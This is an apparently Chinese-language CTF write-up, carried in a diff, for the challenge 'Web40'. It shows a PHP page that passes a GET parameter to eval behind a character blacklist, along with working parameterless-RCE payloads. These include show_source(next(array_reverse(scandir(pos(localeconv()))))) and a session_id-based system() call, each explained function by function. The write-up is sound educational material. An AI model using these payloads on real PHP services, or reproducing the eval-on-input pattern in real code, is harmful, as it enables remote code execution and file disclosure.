@@ -1,0 +1,61 @@
+I"�<h3 id="web40">Web40</h3>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">])){</span>
+  <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">];</span>
+  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/[0-9]|\~|\`|\@|\#|</span><span class="se">\\</span><span class="s2">$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|</span><span class="se">\"</span><span class="s2">|\,|\&lt;|\.|\&gt;|\/|\?|</span><span class="se">\\\\</span><span class="s2">/i"</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
+    <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
+  <span class="p">}</span>
+    
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+  <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><strong>考点：无参数RCE</strong></p>
+
+<blockquote>
+  <p>无参数的意思可以是a()、a(b())或a(b(c()))，但不能是a(‘b’)或a(‘b’,’c’)，不能带参数。</p>
+</blockquote>
+
+<p>这个地方ban的括号是假的…，中文括号，因此带括号的函数都能用。但是过滤的东西还是非常多，常用的<code class="language-plaintext highlighter-rouge">*</code>、<code class="language-plaintext highlighter-rouge">$</code>、<code class="language-plaintext highlighter-rouge">'</code>、<code class="language-plaintext highlighter-rouge">"</code>、<code class="language-plaintext highlighter-rouge">`</code>都被ban掉了。因此要想其他办法了</p>
+
+<p><del>我TM直接查看hint</del></p>
+
+<blockquote>
+  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>show_source(next(array_reverse(scandir(pos(localeconv()))))); 
+</code></pre></div>  </div>
+
+  <p>GXYCTF的禁止套娃 通过cookie获得参数进行命令执行</p>
+  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c=session_start();system(session_id());
+passid=ls
+</code></pre></div>  </div>
+</blockquote>
+
+<p>看样子是构建一个session，然后执行系统函数讲session_id的参数执行</p>
+
+<p>一个一个函数分析吧</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">pos</span><span class="p">()</span> <span class="c1">// 输出数组中当前元素的值</span>
+<span class="nb">localeconv</span><span class="p">()</span> <span class="c1">// 函数返回一包含本地数字及货币格式信息的数组。</span>
+<span class="c1">// localeconv()  函数会返回以下数组元素：</span>
+<span class="c1">// [decimal_point] - 小数点字符</span>
+<span class="c1">// [thousands_sep] - 千位分隔符</span>
+<span class="c1">// [int_curr_symbol] - 货币符号 （例如：USD）</span>
+<span class="c1">// [currency_symbol] - 货币符号 （例如：$）</span>
+<span class="c1">// [mon_decimal_point] - 货币小数点字符</span>
+<span class="c1">// [mon_thousands_sep] - 货币千位分隔符</span>
+<span class="c1">// [positive_sign] - 正值字符</span>
+<span class="c1">// [negative_sign] - 负值字符</span>
+<span class="c1">// [int_frac_digits] - 国际通用小数位</span>
+<span class="c1">// [frac_digits] - 本地通用小数位</span>
+
+<span class="c1">// 这里pos() 拿到了 "." </span>
+<span class="c1">// 因此构造出了 sacndir('.')</span>
+<span class="nb">scandir</span><span class="p">()</span> <span class="c1">// 获取目录下的文件 </span>
+<span class="nb">array_reverse</span><span class="p">()</span> <span class="c1">// 以相反的顺序返回数组 第二个元素变为flag</span>
+<span class="nb">next</span><span class="p">()</span> <span class="c1">// 返回数组中下一个元素 这里返回flag</span>
+<span class="nb">show_source</span><span class="p">()</span> <span class="c1">// 函数对文件进行语法高亮显示 等同于highlight_file()</span>
+</code></pre></div></div>
+
+<p>OK，拿到了flag</p>
+:ET
